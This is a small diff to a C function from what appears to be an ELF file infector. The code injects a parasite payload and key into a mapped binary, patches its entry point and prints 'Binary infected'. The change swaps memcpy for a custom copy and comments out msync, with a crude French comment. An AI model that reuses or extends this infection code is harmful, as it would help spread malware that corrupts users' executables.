@@ -55,11 +55,11 @@ void injection(Elf64_Ehdr *eh, void *base, size_t size, t_elf_data *elf_data)
     vfd = open("obj/assembly/handler_test.bin", O_RDONLY);
     read(vfd, ptr_injection + elf_data->g_parasite_size, elf_data->g_payload_size - elf_data->g_parasite_size);
     close(vfd);
-    memcpy(ptr_injection + elf_data->g_payload_size - 16, elf_data->key, 16);
+    ft_memcpy(ptr_injection + elf_data->g_payload_size - 16, elf_data->key, 16);
 
     patcher(ptr_injection, old_entry, elf_data);
-
-    msync(base, size, MS_SYNC);
+    /* Ptn faut changer ce truc de con */
+    //msync(base, size, MS_SYNC);
     munmap(base, size);
     printf("Binary infected\n");
 }
